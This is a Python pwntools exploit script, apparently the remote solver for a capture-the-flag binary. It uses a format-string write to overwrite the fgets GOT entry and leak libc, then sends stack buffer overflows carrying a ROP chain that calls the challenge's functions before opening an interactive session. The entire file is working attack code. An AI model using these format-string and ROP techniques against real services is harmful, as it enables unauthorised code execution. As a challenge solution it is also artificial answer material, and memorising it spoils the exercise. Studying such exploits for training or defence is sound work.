#!/usr/bin/env python3
"""Remote solver. Set LIBC_PATH or pass --libc to the matching container libc."""
from pwn import *
from pathlib import Path
import argparse, os

context.arch = "amd64"
BASE = Path(__file__).resolve().parent
elf = ELF(str(BASE / "chall"), checksec=False)
OFFSET, KEY = 136, 0x1337BEEF

def stage_one():
    # fgets is called before the vulnerable printf and its GOT entry is resolved.
    got, target, gate = elf.got["fgets"], elf.sym["next_stage"], elf.sym["gate"]
    low, high = gate & 0xffff, (gate >> 16) & 0xff
    # Offset 40 is argument 11 on the remote binary.
    out, n = b"%11$s", 6
    d = (low - n) & 0xffff
    if d: out += b"%1$" + str(d).encode() + b"c"
    out += b"%12$hn"; n = low
    d = (high - (n & 0xff)) & 0xff
    if d: out += b"%1$" + str(d).encode() + b"c"
    out += b"%13$hhn"
    assert len(out) <= 40
    return out.ljust(40, b"A") + p64(got) + p64(target) + p64(target + 2)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("host", nargs="?", default="127.0.0.1")
    p.add_argument("port", nargs="?", type=int, default=8011)
    p.add_argument("--libc", default=os.getenv("LIBC_PATH"))
    a = p.parse_args()
    if not a.libc: p.error("--libc or LIBC_PATH is required")
    if not os.path.isfile(a.libc):
        p.error(f"libc file not found: {a.libc} (use the libc.so.6 from the remote container)")
    libc = ELF(a.libc, checksec=False)
    io = remote(a.host, a.port)
    io.sendlineafter(b"Input : ", stage_one())
    try:
        blob = io.recvuntil(b"Gateway to restricted site.")
    except EOFError:
        log.failure("target exited before gate; output was: %r", io.clean(timeout=0.2))
        raise
    leak = blob.rsplit(b"Input : ", 1)[-1][:6]
    libc.address = u64(leak.ljust(8, b"\0")) - libc.sym["fgets"]
    log.info("libc base = %#x", libc.address)
    io.sendlineafter(b"Input password : ", b"A" * OFFSET + p64(elf.sym["func1"]))
    pop_rdi = ROP(libc).find_gadget(["pop rdi", "ret"])[0]
    ret = ROP(elf).find_gadget(["ret"])[0]
    io.sendlineafter(b"Input : ", flat(b"A" * OFFSET, pop_rdi, KEY, ret, elf.sym["func2"], elf.sym["func3"], libc.sym["exit"]))
    io.sendlineafter(b"Input : ", b"continue")
    io.interactive()

if __name__ == "__main__": main()
